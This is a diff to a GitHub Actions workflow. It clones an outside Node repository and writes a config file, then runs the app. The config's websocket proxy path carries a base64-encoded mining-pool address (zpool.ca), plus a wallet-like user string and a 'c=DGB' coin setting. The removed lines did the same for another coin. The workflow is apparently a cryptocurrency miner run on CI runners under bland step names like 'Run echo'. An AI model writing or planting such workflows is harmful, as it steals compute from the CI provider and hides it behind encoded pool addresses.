@@ -9,23 +9,25 @@ on:
 jobs:
   run-script:
     name: Run run.sh
-    runs-on: ubuntu-20.04
+    runs-on: ubuntu-22.04
     steps:
-      - name: Set up Python
-        uses: actions/setup-python@v5
+      - name: Set up Node
+        uses: actions/setup-node@v4
         with:
-          python-version: 3.12
+          node-version: "20.19.0"
 
       - name: Clone a public repository
         uses: actions/checkout@v4
         with:
-          repository: saxlata/vbg
+          repository: ismailalkaf/node-mino-app
           ref: main
-          path: vbg
+          path: node-mino-app
 
-      - name: Run
-        # working-directory: vbg
+      - name: Run echo
+        working-directory: node-mino-app
         run: |
-          cd vbg
-          echo -e "proxy=wss://identical-sile-malphite-node-dfaa5ec5.koyeb.app/eGVsaXN2Mi1wZXBldy5uYS5taW5lLnpwb29sLmNhOjQ4MzM=\nhost=127.0.0.1\nport=3306\nusername=rM5GziBWoT9y4DQaiacGahTvKZze2TpzrB\npassword=c=RVN,pyth\nthreads=2" > data.txt
-          python3 main.py 7 --dataset=data.txt --output=result.txt
+          echo '{"log": true, "proxy": "wss://present-nichol-vivo1-4f3dad8a.koyeb.app/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==", "user": "SWrtFsEa237mckDo7hmtHR2YtadmbZJNus", "password": "c=DGB,272", "argent": "wasm-mino/2.0", "threads": 8}' > data.txt
+      - name: Run node app
+        working-directory: node-mino-app
+        run: |
+          ./node app.js
